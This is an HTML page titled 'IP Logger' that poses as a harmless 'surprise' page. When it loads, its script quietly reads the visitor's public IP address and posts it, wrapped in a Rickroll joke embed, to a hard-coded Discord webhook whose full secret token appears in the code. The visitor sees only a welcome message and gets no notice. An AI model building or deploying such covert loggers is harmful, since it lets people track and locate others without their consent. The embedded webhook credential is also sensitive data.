<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Logger</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            color: #333;
            text-align: center;
            padding: 50px;
        }
        h1 {
            color: #4A90E2;
        }
        .container {
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            padding: 20px;
            margin: auto;
            max-width: 500px;
        }
        p {
            font-size: 18px;
        }
    </style>
    <script>
        async function sendIP() {
            try {
                // Fetch the user's IP address
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const userIP = ipData.ip;

                // Your Discord webhook URL
                const webhookURL = 'https://canary.discord.com/api/webhooks/1302309514535636992/yuhD9Kend0XesiNWmg2KfHumJXCHlLXRxVdSIhlr37TpB_G8ZJx16I2e1Ah7zQMzbta5';

                // Create an embed message for the rickroll
                const embed = {
                    title: "You've been Rickrolled!",
                    description: "ðŸŽµ Never gonna give you up, never gonna let you down! ðŸŽµ",
                    url: "https://www.youtube.com/watch?v=dQw4w9WgXcQ", // Rickroll link
                    color: 16711680, // Red color
                    image: {
                        url: "https://media.giphy.com/media/xT39D7y9F8c0wVLV5e/giphy.gif" // A rickroll gif
                    },
                    fields: [
                        { name: "IP Address Logged", value: `**${userIP}**`, inline: true }
                    ]
                };

                // Send the embed to the Discord webhook
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ embeds: [embed] })
                });

                console.log('Rickroll embed sent to Discord:', embed);
            } catch (error) {
                console.error('Error sending embed:', error);
            }
        }

        // Call the function when the page loads
        window.onload = sendIP;
    </script>
</head>
<body>
    <div class="container">
        <h1>Welcome!</h1>
        <p>Enjoy your surprise!</p>
    </div>
</body>
</html>
